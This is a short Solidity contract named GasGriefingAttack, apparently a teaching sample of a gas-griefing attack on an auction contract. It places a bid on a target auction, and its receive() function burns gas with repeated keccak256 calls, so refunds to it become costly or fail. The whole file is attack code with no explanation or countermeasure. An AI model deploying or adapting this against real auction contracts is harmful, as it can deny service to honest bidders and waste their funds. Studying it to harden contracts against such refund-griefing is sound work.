// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IAuction {
   function bid() external payable;
}

contract GasGriefingAttack {
   function attack(address _auction) external payable {
       IAuction(_auction).bid{value: msg.value}();
   }

   receive() external payable {
       keccak256("just wasting some gas...");
       keccak256("just wasting some gas...");
       keccak256("just wasting some gas...");
       keccak256("just wasting some gas...");
       keccak256("just wasting some gas...");
       //etc...
   }
}
